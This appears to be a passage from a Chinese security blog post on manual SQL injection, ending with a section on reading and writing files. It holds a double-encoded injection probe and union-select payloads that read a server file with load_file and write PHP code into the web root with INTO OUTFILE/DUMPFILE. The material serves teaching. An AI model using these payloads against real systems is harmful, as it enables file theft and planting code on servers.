+
+<pre class="highlight"><span class="line">%<span class="number">2527</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> %<span class="number">23</span>			</span><br></pre>
+
+<p>后续通过联合注入的方式进行注入</p>
+<p>payload构造的每个语句的单引号都要通过二次编码才能生效</p>
+<h1 id="二：sql注入读写文件"><a href="#二：sql注入读写文件" class="headerlink" title="二：sql注入读写文件"></a>二：sql注入读写文件</h1><h4 id="payload构建-2"><a href="#payload构建-2" class="headerlink" title="payload构建"></a>payload构建</h4><pre class="highlight"><span class="line"><span class="string">&#x27; union select 1,2,load_file(&#x27;</span>/<span class="keyword">var</span>/www/<span class="number">1</span>.txt<span class="string">&#x27;)		//读取文件</span></span><br></pre>
+
+<pre class="highlight"><span class="line"><span class="string">&#x27; union select 1,2,&#x27;</span><span class="meta">&lt;?php</span> phpinfo() <span class="meta">?&gt;</span><span class="string">&#x27; into outfile &#x27;</span>/<span class="keyword">var</span>/www/html<span class="string">&#x27;	//写入文件</span></span><br></pre>
+
+<pre class="highlight"><span class="line"><span class="string">&#x27; union select 1,2,&#x27;</span><span class="meta">&lt;?php</span> phpinfo() <span class="meta">?&gt;</span><span class="string">&#x27; into dumpfile &#x27;</span>/<span class="keyword">var</span>/www/html<span class="string">&#x27;	//写入文件</span></span><br></pre>
+
+
+  </div>
+  <div>
+  
+  <div class="post-note note-warning copyright" style="margin-top: 42px">
+    <p><span style="font-weight: bold;">作者：</span><a target="_blank" rel="nofollow noopener noreferrer" href="http://example.com/about">YiHua</a></p>
+    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="http://example.com/2022/01/16/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">http://example.com/2022/01/16/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/</a></p>
+    <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
+  </div>
+  
+  </div>
+</article>
+<div class="nav">
+  
+  <div class="nav-item-prev">
+    <a href="/2022/01/18/SQL注入/" class="nav-link">
+      <i class="iconfont icon-left nav-prev-icon"></i>
+      <div>
+        <div class="nav-label">上一篇</div>
+        
+        <div class="nav-title">SQL注入 </div>
+        
+      </div>
+    </a>
+  </div>
+  
+  
+  <div class="nav-item-next">
+    <a href="/2022/01/13/webshell应用及变形/" class="nav-link">
+      <div>
+        <div class="nav-label">下一篇</div>
+        
+        <div class="nav-title">webshell应用及变形免杀 </div>
+        
+      </div>
+      <i class="iconfont icon-right nav-next-icon"></i>
+    </a>
+  </div>
+  
+</div>
+
+<div class="card card-content toc-card" id="mobiletoc">
+  <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%EF%BC%9Asql%E6%B3%A8%E5%85%A5"><span class="toc-text">一：sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-text">一：sql注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%A0%B9%E6%8D%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E5%88%86%E7%B1%BB"><span class="toc-text">1.根据请求方式分类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%A0%B9%E6%8D%AE%E6%B3%A8%E5%85%A5%E7%82%B9%E5%8F%82%E6%95%B0%E5%88%86%E7%B1%BB"><span class="toc-text">2.根据注入点参数分类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%A0%B9%E6%8D%AEsql%E6%B3%A8%E5%85%A5%E7%82%B9%E5%8F%8D%E9%A6%88%E7%B1%BB%E5%9E%8B%E5%88%86%E7%B1%BB"><span class="toc-text">3.根据sql注入点反馈类型分类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%A0%B9%E6%8D%AEweb%E5%BA%94%E7%94%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E5%88%86%E7%B1%BB"><span class="toc-text">4.根据web应用的数据库类型分类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-text">二：sql注入万能密码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-text">1.常见的万能密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-text">2.使用原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">三：sql注入联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E6%B3%A8%E5%85%A5%E7%82%B9%E5%92%8C%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-text">1.判断是否有注入点和注入类型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-text">2.判断字段数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">3.联合查询</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%EF%BC%9A%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">四：报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue-%E5%87%BD%E6%95%B0"><span class="toc-text">extractvalue()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#payload%E6%9E%84%E5%BB%BA"><span class="toc-text">payload构建</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E5%87%BD%E6%95%B0"><span class="toc-text">updatexml()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#payload%E6%9E%84%E5%BB%BA-1"><span class="toc-text">payload构建</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%EF%BC%9A%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">五：布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#substr-%E5%87%BD%E6%95%B0"><span class="toc-text">substr()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#length-%E5%87%BD%E6%95%B0"><span class="toc-text">length()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ascii-%E5%87%BD%E6%95%B0"><span class="toc-text">ascii()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BApayload"><span class="toc-text">构建payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%EF%BC%9A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">五：时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep-%E5%87%BD%E6%95%B0"><span class="toc-text">sleep()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#if-%E5%87%BD%E6%95%B0"><span class="toc-text">if()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BApayload-1"><span class="toc-text">构建payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">六：宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BApayload-2"><span class="toc-text">构建payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%83%EF%BC%9A%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="toc-text">七：二次编码注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BApayload-3"><span class="toc-text">构建payload</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-text">二：sql注入读写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload%E6%9E%84%E5%BB%BA-2"><span class="toc-text">payload构建</span></a></li></ol></li></ol></li></ol></li></ol>
+</div></main>
+          <aside class="left-column">
+            
+            <div class="card card-author">
+              
+<img src="/img/author.jpg" class="author-img">
+
+<p class="author-name">YiHua</p>
+<p class="author-description">谨言  深思  笃行</p>
+<div class="author-message">
+  <a class="author-posts-count" href="/archives">
+    <span>27</span>
+    <span>文章</span>
+  </a>
+  <a class="author-categories-count" href="/categories">
+    <span>10</span>
+    <span>分类</span>
+  </a>
+  <a class="author-tags-count" href="/tags">
+    <span>9</span>
+    <span>标签</span>
+  </a>
+</div>
+
+            </div>
+            
+            <div class="sticky-tablet">
+  
+  
+  <article class="display-when-two-columns spacer">
+    <div class="card card-content toc-card">
+      <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%EF%BC%9Asql%E6%B3%A8%E5%85%A5"><span class="toc-text">一：sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-text">一：sql注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%A0%B9%E6%8D%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E5%88%86%E7%B1%BB"><span class="toc-text">1.根据请求方式分类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%A0%B9%E6%8D%AE%E6%B3%A8%E5%85%A5%E7%82%B9%E5%8F%82%E6%95%B0%E5%88%86%E7%B1%BB"><span class="toc-text">2.根据注入点参数分类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%A0%B9%E6%8D%AEsql%E6%B3%A8%E5%85%A5%E7%82%B9%E5%8F%8D%E9%A6%88%E7%B1%BB%E5%9E%8B%E5%88%86%E7%B1%BB"><span class="toc-text">3.根据sql注入点反馈类型分类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%A0%B9%E6%8D%AEweb%E5%BA%94%E7%94%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E5%88%86%E7%B1%BB"><span class="toc-text">4.根据web应用的数据库类型分类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-text">二：sql注入万能密码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-text">1.常见的万能密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-text">2.使用原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">三：sql注入联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E6%B3%A8%E5%85%A5%E7%82%B9%E5%92%8C%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-text">1.判断是否有注入点和注入类型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-text">2.判断字段数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">3.联合查询</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%EF%BC%9A%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">四：报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue-%E5%87%BD%E6%95%B0"><span class="toc-text">extractvalue()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#payload%E6%9E%84%E5%BB%BA"><span class="toc-text">payload构建</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E5%87%BD%E6%95%B0"><span class="toc-text">updatexml()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#payload%E6%9E%84%E5%BB%BA-1"><span class="toc-text">payload构建</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%EF%BC%9A%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">五：布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#substr-%E5%87%BD%E6%95%B0"><span class="toc-text">substr()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#length-%E5%87%BD%E6%95%B0"><span class="toc-text">length()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ascii-%E5%87%BD%E6%95%B0"><span class="toc-text">ascii()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BApayload"><span class="toc-text">构建payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%EF%BC%9A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">五：时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep-%E5%87%BD%E6%95%B0"><span class="toc-text">sleep()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#if-%E5%87%BD%E6%95%B0"><span class="toc-text">if()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BApayload-1"><span class="toc-text">构建payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">六：宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BApayload-2"><span class="toc-text">构建payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%83%EF%BC%9A%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="toc-text">七：二次编码注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BApayload-3"><span class="toc-text">构建payload</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-text">二：sql注入读写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload%E6%9E%84%E5%BB%BA-2"><span class="toc-text">payload构建</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header"><i class="iconfont icon-fenlei" style="padding-right: 2px;"></i>分类</div>
+  <div class="categories-list">
+    
+      <a href="/categories/计算机网络/">
+        <div class="categories-list-item">
+          计算机网络
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/CentoS-7基础/">
+        <div class="categories-list-item">
+          CentoS-7基础
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/web安全/">
+        <div class="categories-list-item">
+          web安全
+          <span class="categories-list-item-badge">7</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Mysql数据库/">
+        <div class="categories-list-item">
+          Mysql数据库
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/php代码基础/">
+        <div class="categories-list-item">
+          php代码基础
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+      <a href="/categories/windows-2008-R2/">
+        <div class="categories-list-item">
+          windows-2008-R2
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/文件上传漏洞/">
+        <div class="categories-list-item">
+          文件上传漏洞
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/文件包含漏洞/">
+        <div class="categories-list-item">
+          文件包含漏洞
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/渗透测试/">
+        <div class="categories-list-item">
+          渗透测试
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/代码审计/">
+        <div class="categories-list-item">
+          代码审计
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header"><i class="iconfont icon-biaoqian" style="padding-right: 2px;"></i>热门标签</div>
+  <div class="tags-list">
+    
+    <a href="/tags/SQL注入/" title="SQL注入"><div class="tags-list-item">SQL注入</div></a>
+    
+    <a href="/tags/Linux/" title="Linux"><div class="tags-list-item">Linux</div></a>
+    
+    <a href="/tags/计算机网络/" title="计算机网络"><div class="tags-list-item">计算机网络</div></a>
+    
+    <a href="/tags/php代码基础/" title="php代码基础"><div class="tags-list-item">php代码基础</div></a>
+    
+    <a href="/tags/web安全/" title="web安全"><div class="tags-list-item">web安全</div></a>
+    
+    <a href="/tags/代码审计/" title="代码审计"><div class="tags-list-item">代码审计</div></a>
+    
+    <a href="/tags/渗透测试/" title="渗透测试"><div class="tags-list-item">渗透测试</div></a>
+    
+    <a href="/tags/windows/" title="windows"><div class="tags-list-item">windows</div></a>
+    
+    <a href="/tags/webshell/" title="webshell"><div class="tags-list-item">webshell</div></a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+          <aside class="right-column">
+            <div class="sticky-widescreen">
+  
+  
+  <article class="card card-content toc-card">
+    <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%EF%BC%9Asql%E6%B3%A8%E5%85%A5"><span class="toc-text">一：sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-text">一：sql注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%A0%B9%E6%8D%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E5%88%86%E7%B1%BB"><span class="toc-text">1.根据请求方式分类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%A0%B9%E6%8D%AE%E6%B3%A8%E5%85%A5%E7%82%B9%E5%8F%82%E6%95%B0%E5%88%86%E7%B1%BB"><span class="toc-text">2.根据注入点参数分类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%A0%B9%E6%8D%AEsql%E6%B3%A8%E5%85%A5%E7%82%B9%E5%8F%8D%E9%A6%88%E7%B1%BB%E5%9E%8B%E5%88%86%E7%B1%BB"><span class="toc-text">3.根据sql注入点反馈类型分类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%A0%B9%E6%8D%AEweb%E5%BA%94%E7%94%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E5%88%86%E7%B1%BB"><span class="toc-text">4.根据web应用的数据库类型分类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-text">二：sql注入万能密码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-text">1.常见的万能密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-text">2.使用原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">三：sql注入联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E6%B3%A8%E5%85%A5%E7%82%B9%E5%92%8C%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-text">1.判断是否有注入点和注入类型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-text">2.判断字段数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">3.联合查询</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%EF%BC%9A%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">四：报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue-%E5%87%BD%E6%95%B0"><span class="toc-text">extractvalue()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#payload%E6%9E%84%E5%BB%BA"><span class="toc-text">payload构建</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E5%87%BD%E6%95%B0"><span class="toc-text">updatexml()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#payload%E6%9E%84%E5%BB%BA-1"><span class="toc-text">payload构建</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%EF%BC%9A%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">五：布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#substr-%E5%87%BD%E6%95%B0"><span class="toc-text">substr()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#length-%E5%87%BD%E6%95%B0"><span class="toc-text">length()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ascii-%E5%87%BD%E6%95%B0"><span class="toc-text">ascii()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BApayload"><span class="toc-text">构建payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%EF%BC%9A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">五：时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep-%E5%87%BD%E6%95%B0"><span class="toc-text">sleep()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#if-%E5%87%BD%E6%95%B0"><span class="toc-text">if()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BApayload-1"><span class="toc-text">构建payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">六：宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BApayload-2"><span class="toc-text">构建payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%83%EF%BC%9A%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="toc-text">七：二次编码注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BApayload-3"><span class="toc-text">构建payload</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-text">二：sql注入读写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload%E6%9E%84%E5%BB%BA-2"><span class="toc-text">payload构建</span></a></li></ol></li></ol></li></ol></li></ol>
+  </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header"><i class="iconfont icon-wenzhang_huaban" style="padding-right: 2px;"></i>最近文章</div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-23</div>
+        <a href="/2022/02/23/文件包含漏洞/"><div class="recent-posts-item-content">文件包含漏洞</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-23</div>
+        <a href="/2022/02/23/文件上传漏洞/"><div class="recent-posts-item-content">文件上传漏洞</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-17</div>
+        <a href="/2022/02/17/mysql数据外带/"><div class="recent-posts-item-content"></div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-17</div>
+        <a href="/2022/02/17/一：获取数据库网站密码/"><div class="recent-posts-item-content"></div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>Copyright ©
+          
+          2020 -
+          
+          2022
+        </span>
+        &nbsp;
+        <a href="/" class="footer-link">混口饭吃 </a>
+      </div>
+    </div>
+
+    
+    <div class="footer-dsc">
+      
+      Powered by
+      <a href="https://hexo.io/" class="footer-link" target="_blank" rel="nofollow noopener noreferrer">&nbsp;Hexo </a>
+      
+      
+      <span>&nbsp;|&nbsp;</span>
+      
+      
+      Theme -
+      <a href="https://github.com/theme-kaze" class="footer-link" target="_blank"
+        rel="nofollow noopener noreferrer">&nbsp;Kaze</a>
+      
+    </div>
+    
+    
+    
+    
+</footer>
+  <a role="button" id="scrollbutton" class="basebutton"  aria-label="回到顶部">
+  <i class="iconfont icon-arrowleft button-icon"></i>
+</a>
+<a role="button" id="menubutton" class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a role="button" id="popbutton" class="basebutton" aria-label="控制中心">
